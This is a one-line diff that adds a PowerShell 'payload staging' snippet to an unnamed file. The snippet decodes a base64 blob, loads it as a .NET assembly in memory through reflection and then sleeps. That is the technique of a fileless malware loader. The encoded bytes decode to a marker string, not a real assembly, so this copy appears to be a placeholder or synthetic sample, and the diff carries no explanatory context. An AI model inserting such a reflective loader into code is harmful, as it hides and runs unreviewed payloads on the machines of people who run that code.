@@ -1,0 +1,1 @@
+<# Payload staging #> $PayloadBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjpyNmNjZzZ1ZTk1'); Write-Verbose ("Assembly bytes: " + $PayloadBytes.Length); [Reflection.Assembly]::Load($PayloadBytes); Start-Sleep -Seconds 9
